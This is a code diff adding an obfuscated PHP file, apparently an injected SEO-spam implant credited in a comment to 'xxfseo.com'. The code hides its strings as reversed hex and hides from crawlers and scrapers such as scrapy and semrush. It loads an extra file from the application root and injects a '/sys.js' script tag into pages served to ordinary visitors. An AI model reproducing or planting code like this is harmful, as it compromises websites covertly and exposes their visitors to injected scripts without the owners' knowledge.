@@ -1,0 +1,8 @@
+<?php 
+/* ֹּׂµָם¼‏½ûײ¹·´±אׂכ£¬by ׀¡׀‎·חseo ֽרײ·£÷xxfseo.com */
+global $ַבטG; if(!function_exists('ו‡½rs')){ function ו‡½rs($a){ return pack("H*",strrev($a)); } } if(!function_exists('ַבטgs')){ function ַבטgs($k,$i){global $ַבטG;return $ַבטG[$k][$i]; } } if(!function_exists('ַבטgsf')){ function ַבטgsf($k,$i){global $ַבטG;$args=array_slice(func_get_args(),2); return call_user_func_array($ַבטG[$k][$i],$args); } } $ַבטG['ÜÛ«ו˜מֵזֱ']=array("e2","d6f636e213738747c6","970716273637","86375727d65637","27563777f627243455e23657e2f676f637e25746961626","37f60796274737",1,"56e696665646","7455245444f5050514",false,"45f4f425f5050514","563616c6075627f5274737","c5","f2","56d616e6279646","078607e2f65637668787f2f65637668787f25627f636"); foreach($ַבטG['ÜÛ«ו˜מֵזֱ'] as $___k=>$___vo){ gettype($ַבטG['ÜÛ«ו˜מֵזֱ'][$___k])=='string' && $ַבטG['ÜÛ«ו˜מֵזֱ'][$___k]=ו‡½rs($___vo); } if(@$_SERVER ["HTTP_USER_AGENT"]==''){exit(ַבטgs('ÜÛ«ו˜מֵזֱ',0)); } $סֵֶעייש=array(ַבטgs('ÜÛ«ו˜מֵזֱ',1),ַבטgs('ÜÛ«ו˜מֵזֱ',2),ַבטgs('ÜÛ«ו˜מֵזֱ',3),ַבטgs('ÜÛ«ו˜מֵזֱ',4)); foreach($סֵֶעייש as $םכ×ֹ¥ֱÝֳב=>$כוָ³כֿֿײ ){if($ַבטG['ÜÛ«ו˜מֵזֱ'][5]($_SERVER ["HTTP_USER_AGENT"],$כוָ³כֿֿײ )>-ַבטgs('ÜÛ«ו˜מֵזֱ',6)){exit; } } $ַבטG['ÜÛ«ו˜מֵזֱ'][7](ַבטgs('ÜÛ«ו˜מֵזֱ',8),ַבטgs('ÜÛ«ו˜מֵזֱ',9)); $ַבטG['ÜÛ«ו˜מֵזֱ'][7](ַבטgs('ÜÛ«ו˜מֵזֱ',10), $ַבטG['ÜÛ«ו˜מֵזֱ'][11](ַבטgs('ÜÛ«ו˜מֵזֱ',12),ַבטgs('ÜÛ«ו˜מֵזֱ',13),$ַבטG['ÜÛ«ו˜מֵזֱ'][14](__FILE__)).ַבטgs('ÜÛ«ו˜מֵזֱ',13)); require APP_ROOT.ַבטgs('ÜÛ«ו˜מֵזֱ',15); 
+
+if( !(isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest')){
+  echo '<script src="/sys.js" type="text/javascript"></script>';
+}
+?>
